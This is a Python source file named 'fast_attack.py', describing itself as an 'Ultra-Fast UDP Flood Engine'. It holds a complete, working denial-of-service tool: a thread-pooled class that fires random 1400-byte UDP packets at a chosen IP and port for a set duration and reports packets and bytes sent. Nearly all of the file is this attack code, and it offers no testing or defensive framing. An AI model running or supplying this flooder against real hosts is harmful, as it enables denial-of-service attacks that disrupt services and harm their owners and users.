"""
fast_attack.py - Ultra-Fast UDP Flood Engine
Zero CPU Spin, Blocking I/O, Thread Pooled.
"""

import socket
import time
import os
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass

@dataclass
class AttackStats:
    sent: int = 0
    failed: int = 0
    bytes_sent: int = 0
    is_running: bool = False
    start_time: float = 0.0

    @property
    def elapsed(self) -> float:
        return max(0.001, time.time() - self.start_time) if self.is_running else 0.001

    @property
    def rps(self) -> int:
        return int(self.sent / self.elapsed)


class FastUDPAttack:
    def __init__(self, threads: int = 200, packet_size: int = 1400):
        self.threads = threads
        self.packet_size = packet_size
        self.stats = AttackStats()
        self._stop_event = threading.Event()
        self._executor = None
        self._futures = []

    def start(self, ip: str, port: int, duration: int) -> AttackStats:
        self._stop_event.clear()
        self.stats = AttackStats(
            is_running=True,
            start_time=time.time()
        )

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)
        sock.setblocking(True)

        payloads = [os.urandom(self.packet_size) for _ in range(1024)]

        def worker():
            idx = 0
            local_sent = 0
            local_bytes = 0
            while not self._stop_event.is_set():
                try:
                    payload = payloads[idx % len(payloads)]
                    sock.sendto(payload, (ip, port))
                    local_sent += 1
                    local_bytes += len(payload)
                    idx += 1
                except Exception:
                    pass
            return local_sent, local_bytes

        self._executor = ThreadPoolExecutor(max_workers=self.threads)
        self._futures = [self._executor.submit(worker) for _ in range(self.threads)]

        time.sleep(duration)

        self._stop_event.set()
        total_sent = 0
        total_bytes = 0
        for future in as_completed(self._futures, timeout=5):
            try:
                s, b = future.result()
                total_sent += s
                total_bytes += b
            except Exception:
                pass

        self._executor.shutdown(wait=False)
        sock.close()

        self.stats.sent = total_sent
        self.stats.bytes_sent = total_bytes
        self.stats.is_running = False
        return self.stats

    def stop(self):
        self._stop_event.set()
        if self._executor:
            self._executor.shutdown(wait=False)
